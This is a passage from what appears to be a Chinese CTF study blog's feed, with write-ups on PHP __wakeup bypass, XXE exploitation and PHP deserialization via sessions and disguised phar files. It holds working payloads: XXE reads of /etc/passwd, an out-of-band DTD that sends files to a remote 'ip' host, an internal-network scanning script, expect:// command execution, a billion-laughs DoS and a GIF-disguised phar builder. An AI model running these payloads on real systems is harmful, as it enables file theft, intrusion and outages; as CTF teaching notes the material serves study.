<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    private $test1&#x3D;&quot;hello&quot;;</span><br><span class="line">    public $test2&#x3D;&quot;hello&quot;;</span><br><span class="line">    protected $test3&#x3D;&quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test &#x3D; new test();</span><br><span class="line">echo serialize($test);  </span><br><span class="line">&#x2F;&#x2F;输出到控制台是这样的</span><br><span class="line">O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>但是其实结果不是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;s:11:&quot;\00test\00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;\00*\00test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>结果是这样的,只是因为\00是空字符在控制台不显示</p>
<p>仔细观察,s:后面的数字,后属性名是不匹配的,说明有些字符没有显示,就是空字符</p>
<p>如果在url传参中就需要将<code>\00</code>编码称<code>%00</code>进行传参</p>
<p>比如上述传参就需要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;&#123;s:11:&quot;%00test%00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;%00*%00test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h2><p><strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class test &#123;</span><br><span class="line">	public $a&#x3D;&quot;flag&#123;test&#125;&quot;;</span><br><span class="line">	function __wakeup () &#123;</span><br><span class="line">		&#x2F;&#x2F; TODO: Implement __wakeup() method.</span><br><span class="line">		$this-&gt;a&#x3D;&quot;no&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __destruct () &#123;</span><br><span class="line">		&#x2F;&#x2F; TODO: Implement __destruct() method.</span><br><span class="line">		echo $this-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;&quot;O:4:\&quot;test\&quot;:1:&#123;s:1:\&quot;a\&quot;;s:10:\&quot;flag&#123;test&#125;\&quot;;&#125;&quot;;</span><br><span class="line">$b &#x3D; unserialize($a);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;输出</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
<p>当我们正常传入一个序列化字符串时,会触发<code>__wakeup()</code>,只能输出no</p>
<p>但是当传入的属性值大于真实的属性值时,就会正常输出flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;&quot;O:4:\&quot;test\&quot;:1:&#123;s:1:\&quot;a\&quot;;s:10:\&quot;flag&#123;test&#125;\&quot;;&#125;&quot;;</span><br><span class="line">$b &#x3D; unserialize($a);</span><br><span class="line">&#x2F;&#x2F;输出</span><br><span class="line">flag&#123;test&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>该漏洞在PHP7.3.0是不能复现成功的</p>
<p>PHP7.3.0版本中并没有出现类似PHP5.6的调用过程，只是做了简单的标记，整个魔法函数的调用过程的时机移至释放数据处。这样就避免了这个绕过的问题</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/866/#321-unserialize">PHP 内核层解析反序列化漏洞—绕过__wakeup()</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2020/04/17/CTF/XXE/</url>
    <content><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="0x01什么是XXE"><a href="#0x01什么是XXE" class="headerlink" title="0x01什么是XXE"></a>0x01什么是XXE</h2><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入,不仅能够注入XML代码,还能注入XML<strong>外部实体</strong></p>
<p>如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面.</p>
<a id="more"></a>

<h2 id="0x02基础语法"><a href="#0x02基础语法" class="headerlink" title="0x02基础语法"></a>0x02基础语法</h2><p><a href="https://www.runoob.com/xml/xml-syntax.html">XML基础语法</a></p>
<p><a href="https://www.runoob.com/xml/xml-dtd.html">XML与DTD</a></p>
<p><a href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD教程</a></p>
<h2 id="0x03外部实体"><a href="#0x03外部实体" class="headerlink" title="0x03外部实体"></a>0x03外部实体</h2><p><strong>重点一：</strong></p>
<p>实体分为两种，内部实体和<strong>外部实体</strong>,实体可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
<p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p>
<p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
<p><strong>重点二：</strong></p>
<p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p>
<p><strong>1.通用实体</strong></p>
<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure>
<p><strong>2.参数实体：</strong></p>
<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 %实体名; 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
<p><strong>抛转：</strong></p>
<p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p>
<h2 id="0x04利用"><a href="#0x04利用" class="headerlink" title="0x04利用"></a>0x04利用</h2><h3 id="1、有回显读本地敏感文件-Normal-XXE"><a href="#1、有回显读本地敏感文件-Normal-XXE" class="headerlink" title="1、有回显读本地敏感文件(Normal XXE)"></a>1、有回显读本地敏感文件(Normal XXE)</h3><p><strong>示例代码：</strong></p>
<p><strong>xml.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds &#x3D; simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2、无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#2、无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="2、无回显读取本地敏感文件(Blind OOB XXE)"></a>2、无回显读取本地敏感文件(Blind OOB XXE)</h3><p><strong>xml.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$dom &#x3D; new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>test.dtd</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p><strong>整个调用过程：</strong></p>
<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
<h3 id="3、HTTP-内网主机探测"><a href="#3、HTTP-内网主机探测" class="headerlink" title="3、HTTP 内网主机探测"></a>3、HTTP 内网主机探测</h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
<p><strong>探测脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;&#x2F;stuff&gt;</span><br><span class="line">#&lt;&#x2F;xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    url&#x3D;&quot;存在xxe的url地址&quot;</span><br><span class="line">    headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125;</span><br><span class="line">    x &#x3D; requests.post(url, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text</span><br><span class="line">    coded_string &#x3D; x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i &#x3D; str(i)</span><br><span class="line">        ip &#x3D; &#39;10.0.0.&#39; + i</span><br><span class="line">        string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>
<h3 id="4、HTTP-内网主机端口扫描"><a href="#4、HTTP-内网主机端口扫描" class="headerlink" title="4、HTTP 内网主机端口扫描"></a>4、HTTP 内网主机端口扫描</h3><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure>
<h3 id="5、内网盲注-CTF"><a href="#5、内网盲注-CTF" class="headerlink" title="5、内网盲注(CTF)"></a>5、内网盲注(CTF)</h3><p>2018 强网杯 Wechat</p>
<p><a href="https://www.anquanke.com/post/id/103213#h2-5">2018 强网杯 WP</a></p>
<h3 id="6、文件上传"><a href="#6、文件上传" class="headerlink" title="6、文件上传"></a>6、文件上传</h3><p>Java <code>jar://</code>协议相关，自行查看Reference</p>
<h3 id="7、钓鱼："><a href="#7、钓鱼：" class="headerlink" title="7、钓鱼："></a>7、钓鱼：</h3><p>利用ftp协议结合CRLF注入向SMTP服务器发送任意命令达到发送任意邮件的给任意人，详情查看Reference</p>
<h3 id="8、其他"><a href="#8、其他" class="headerlink" title="8、其他"></a>8、其他</h3><h4 id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;&#x2F;dir&gt;</span><br></pre></td></tr></table></figure>
<h4 id="2-利用-XXE-进行-DOS-攻击"><a href="#2-利用-XXE-进行-DOS-攻击" class="headerlink" title="2. 利用 XXE 进行 DOS 攻击"></a><strong>2. 利用 XXE 进行 DOS 攻击</strong></h4><p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">     &lt;!DOCTYPE lolz [</span><br><span class="line">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">     ]&gt;</span><br><span class="line">     &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>XXE在ctf比赛中也算比较常见，最近做题碰到很多的xxe的题目，大多题目难度比较适中，记录系统学习一下</p>
<h2 id="0x06Reference"><a href="#0x06Reference" class="headerlink" title="0x06Reference"></a>0x06Reference</h2><p><a href="https://xz.aliyun.com/t/3357#toc-24">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP常见反序列化漏洞</title>
    <url>/2020/04/14/CTF/PHP%E5%B8%B8%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="PHP常见反序列化漏洞"><a href="#PHP常见反序列化漏洞" class="headerlink" title="PHP常见反序列化漏洞"></a>PHP常见反序列化漏洞</h1><h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><h3 id="Session序列化机制"><a href="#Session序列化机制" class="headerlink" title="Session序列化机制"></a>Session序列化机制</h3><p>Session是以序列化字符串的形式存储在文件中的,读取Session是一个反序列化的过程,那么就有可能出现反序列化漏洞</p>
<p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）</p>
<a id="more"></a>

<p>PHP处理器的三种序列化方式：</p>
<table>
<thead>
<tr>
<th align="left">处理器</th>
<th align="left">存储方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">php_binary</td>
<td align="left">键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="left">php</td>
<td align="left">键名＋竖线＋经过serialize()函数反序列处理的值</td>
</tr>
<tr>
<td align="left">php_serialize</td>
<td align="left">serialize()函数反序列处理数组方式</td>
</tr>
</tbody></table>
<p>php.ini中含有几个与session存储配置相关的配置项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.save_path&#x3D;&quot;&quot;   --设置session的存储路径,默认在&#x2F;tmp</span><br><span class="line">session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler   --定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>
<h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><p>当由于处理session的处理器不同时就可以触发反序列化漏洞</p>
<p>处理器是php时,是以|后为反序列化内容的,而用php_serialize存储的session如果没有过滤<code>|</code>字符就会导致php处理器将后面的内容反序列化,达到反序列化成对象的目的</p>
<h2 id="phar伪协议触发反序列化"><a href="#phar伪协议触发反序列化" class="headerlink" title="phar伪协议触发反序列化"></a>phar伪协议触发反序列化</h2><h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
<h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用<code>.phar</code>作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p>
<p>安装phar扩展然后在php.ini中设置phar.readonly=off或0才可以使用phar对象创建phar文件</p>
<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p><a href="https://www.php.net/phar">Phar官方文档</a></p>
<p>1、a stub<br>识别phar拓展的标识，格式:xxx。对应的函数Phar::setStub</p>
<p>2、a manifest describing the contents<br>被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata—设置phar归档元数据</p>
<p>3、 the file contents<br>被压缩文件的内容。</p>
<p>4、[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。对应函数Phar :: stopBuffering —停止缓冲对Phar存档的写入请求，并将更改保存到磁盘</p>
<h3 id="Phar内置方法"><a href="#Phar内置方法" class="headerlink" title="Phar内置方法"></a>Phar内置方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$phar &#x3D; new Phar(&#39;phar&#x2F;hpdoger.phar&#39;); &#x2F;&#x2F;实例一个phar对象供后续操作</span><br><span class="line">$phar-&gt;startBuffering()  &#x2F;&#x2F;开始缓冲Phar写操作</span><br><span class="line">$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo &#39;this is test file&#39;;&#39;); &#x2F;&#x2F;以字符串的形式添加一个文件到 phar 档案</span><br><span class="line">$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) &#x2F;&#x2F;把一个目录下的文件归档到phar档案</span><br><span class="line">$phar-&gt;extractTo()  &#x2F;&#x2F;解压一个phar包的函数，extractTo 提取phar文档内容</span><br></pre></td></tr></table></figure>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $o &#x3D; new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line"></span><br><span class="line">    $phar-&gt;stopBuffering();&#x2F;&#x2F;签名自动计算</span><br><span class="line">&#x2F;&#x2F;创建phar文件</span><br><span class="line">&lt;?php </span><br><span class="line">    class TestObject &#123;</span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">            echo &#39;Destruct called&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;test.txt&#39;;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">&#x2F;&#x2F;利用页面</span><br><span class="line">&#x2F;&#x2F;输出</span><br><span class="line">Destruct called</span><br><span class="line">&#x2F;&#x2F;所以达到了反序列化TestObject对象的目的</span><br></pre></td></tr></table></figure>
<h3 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h3><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">    $o &#x3D; new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;生成的phar文件会被文件头检测为GIF</span><br></pre></td></tr></table></figure>
<h2 id="使用php内置类进行反序列化攻击"><a href="#使用php内置类进行反序列化攻击" class="headerlink" title="使用php内置类进行反序列化攻击"></a>使用php内置类进行反序列化攻击</h2><h3 id="PHP内置类"><a href="#PHP内置类" class="headerlink" title="PHP内置类"></a>PHP内置类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$classes &#x3D; get_declared_classes();</span><br><span class="line">foreach ($classes as $class) &#123;</span><br><span class="line">	$methods &#x3D; get_class_methods($class);</span><br><span class="line">	foreach ($methods as $method) &#123;</span><br><span class="line">		if (in_array($method, array(</span><br><span class="line">			&#39;__destruct&#39;,</span><br><span class="line">			&#39;__toString&#39;,</span><br><span class="line">			&#39;__wakeup&#39;,</span><br><span class="line">			&#39;__call&#39;,</span><br><span class="line">			&#39;__callStatic&#39;,</span><br><span class="line">			&#39;__get&#39;,</span><br><span class="line">			&#39;__set&#39;,</span><br><span class="line">			&#39;__isset&#39;,</span><br><span class="line">			&#39;__unset&#39;,</span><br><span class="line">			&#39;__invoke&#39;,</span><br><span class="line">			&#39;__set_state&#39;</span><br><span class="line">		))) &#123;</span><br><span class="line">			print $class . &#39;::&#39; . $method . &quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span 